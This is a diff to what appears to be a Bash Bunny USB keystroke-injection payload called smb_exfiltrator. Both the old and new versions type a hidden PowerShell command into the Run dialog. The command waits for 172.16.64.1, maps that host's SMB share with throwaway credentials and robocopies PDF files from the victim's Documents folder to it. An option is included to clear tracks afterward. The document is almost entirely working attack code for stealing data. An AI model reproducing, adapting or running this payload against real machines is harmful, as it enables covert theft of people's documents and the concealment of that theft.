@@ -19,7 +19,7 @@
 #
 # OPTIONS
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
-EXFILTRATE_FILES="*.pdf"
+EF="*.pdf" #File extension to loot, multiple extensions can be used by seperating extensions with spaces
 CLEARTRACKS="yes" # yes or no
 
 # Initialization
@@ -40,7 +40,7 @@ LED R G
 ATTACKMODE HID
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
+QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e g /USER:g; robocopy ([environment]::getfolderpath('mydocuments')) \\\172.16.64.1\e $EF /S; exit } }\""
 QUACK ENTER
 
 # Clear tracks?
